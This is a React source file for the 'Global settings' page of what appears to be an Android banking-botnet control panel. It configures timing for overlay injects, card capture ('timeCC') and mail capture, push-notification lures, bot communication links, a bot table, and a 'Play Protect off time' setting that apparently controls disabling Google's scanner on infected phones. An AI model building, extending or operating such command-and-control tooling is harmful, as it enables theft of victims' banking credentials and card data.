import React from 'react';
import AutoUpdateSelect from '../Controls/Settings/AutoUpdateSelect';
import EditTimesSettings from '../Controls/Settings/EditTimesSettings';
import SettingsContext from '../Settings';

import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import LinksAddForm from '../Controls/Settings/LinksAddForm';
import PushEdit from '../Controls/Settings/PushEdit';
import ProtectEdit from '../Controls/Settings/ProtectEdit';


function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

class SettingsPage extends React.Component {

    constructor(props) {
        super(props);
        this.state ={
            LoadHash: ''
        };
    }

    componentWillMount() {
        this.LoadSettingsFromServer();
    }

    componentWillUpdate () {
    }

    logOutEvent() {
        var cookies = document.cookie.split(";");
        for (var i = 0; i < cookies.length; i++) {
            createCookie(cookies[i].split("=")[0],"",-1);
        }
        document.location = "/?logout";
    }


    UpdatePanel() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"startUpdateCommand"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
                    SettingsContext.ShowToastTitle('success', 'Update completed', result.msg);
				}
				
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'ERROR WHILE UPDATE. Show console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }


    async LoadSettingsFromServer() {
        while(isNullOrUndefined(SettingsContext.restApiUrl)) await SettingsContext.sleep(500);
        while(SettingsContext.restApiUrl.length < 15) await SettingsContext.sleep(500);
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getGlobalSettings"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					SettingsContext.arrayUrl = result.arrayUrl;
					SettingsContext.timeInject = result.timeInject;
					SettingsContext.timeCC = result.timeCC;
					SettingsContext.timeMail = result.timeMail;
					SettingsContext.pushTitle = result.pushTitle;
					SettingsContext.pushText = result.pushText;
                    SettingsContext.timeProtect = result.timeProtect;
                    SettingsContext.AccessKey = result.key;
					if(result.updateTableBots == 0) {
						SettingsContext.autoUpdateDelay = 0;
						SettingsContext.autoUpdateEnable = false;
					}
					else {
						SettingsContext.autoUpdateDelay = result.updateTableBots;
						SettingsContext.autoUpdateEnable = true;
					}
					SettingsContext.SaveSettingsCookies();
					this.setState({
						LoadHash: Math.random().toString()
                    });
                    
                    if(result.version != SettingsContext.youBotVersion) {
                        SettingsContext.ShowToastTitle('warn', 'Update started...', 'You need update');
                        this.UpdatePanel();
                    }
				}
				
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'ERROR LOADING SETTINGS FROM SERVER. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () {
        return (
            <div>
                <div class="row">
                    <div class="col">
                        <h1 class="pageHeader disable-select animated fadeIn">Global settings</h1>
                    </div>
                    <div class="col">
                        <button type="button" style={({float:'right'})} onClick={this.logOutEvent.bind(this)} class="btn btn-outline-danger">Log out</button>
                    </div>
                </div>
                <div class="row">
                    <div class="col-4">
                        <div class="animated fadeIn card border-primary mb-3">
                            <div class="card-body text-primary">
                            <h5 class="card-title">Table settings</h5>
                            <AutoUpdateSelect updateHash={this.state.LoadHash}/>
                            </div>
                        </div>
                    </div>
                    <div class="col-4">
                        <div class="animated fadeIn card border-primary mb-3">
                            <div class="card-body text-primary">
                            <h5 class="card-title">Bot time global settings</h5>
                            <EditTimesSettings updateHash={this.state.LoadHash}/>
                            </div>
                        </div>
                    </div>
                    <div class="col-4">
                        <div class="animated fadeIn card border-primary mb-3">
                            <div class="card-body text-primary">
                            <h5 class="card-title">Bot global settings</h5>
                            <PushEdit updateHash={this.state.LoadHash}/>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-8">
                        <div class="animated fadeIn card border-primary mb-3">
                            <div class="card-body text-primary">
                            <h5 class="card-title">Links to communicate with the bot</h5>
                            <LinksAddForm updateHash={this.state.LoadHash}/>
                            </div>
                        </div>
                    </div>
                    <div class="col-4">
                        <div class="animated fadeIn card border-primary mb-3">
                            <div class="card-body text-primary">
                            <h5 class="card-title">Play Protect off time</h5>
                            <ProtectEdit updateHash={this.state.LoadHash} />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        );
    }
}

export default SettingsPage;